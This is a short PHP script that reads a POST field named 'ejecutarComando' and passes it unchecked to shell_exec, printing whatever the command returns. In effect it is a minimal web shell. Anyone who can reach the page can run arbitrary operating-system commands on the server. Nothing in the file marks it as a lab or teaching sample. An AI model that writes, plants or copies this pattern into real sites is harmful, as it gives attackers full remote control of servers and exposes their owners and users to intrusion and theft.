<?php
$comando = $_POST['ejecutarComando'];
$salida = shell_exec( $comando );
echo "<pre>$salida</pre>";

?>


